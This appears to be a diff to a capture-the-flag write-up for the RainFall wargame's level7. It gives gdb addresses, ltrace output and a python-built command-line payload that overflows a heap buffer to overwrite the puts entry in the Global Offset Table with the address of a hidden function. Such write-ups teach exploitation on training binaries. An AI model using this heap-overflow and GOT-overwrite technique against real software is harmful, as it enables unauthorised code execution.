@@ -17,8 +17,6 @@ $1 = {<text variable, no debug info>} 0x80484f4 <m>
 0x08049928 value of puts in GOT
 0x080484f4 value of m
 
-can't pass argv[2] to gdb, most annoying to get the offset, I assumed 16 but it actually overrides the address of  `b[1]` in the third malloc at a padding of 20
-
 By running `ltrace` we see that we can change the destination address of the second strcpy call:
 ```shell
 level7@RainFall:~$ ltrace ./level7 "ARGV1" "ARGV2"
@@ -48,6 +46,7 @@ fgets( <unfinished ...>
 +++ killed by SIGSEGV +++
 ```
 
+We see here that if we can succesfully overwrite the value in b[1] with our argv[1], we can then write to that address in b[1].
 So we can use it to overwrite the Global Offset Table value of `puts` with the address of `m`.
 ```shell
 level7@RainFall:~$ ./level7 $(python -c 'print "a"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')                        
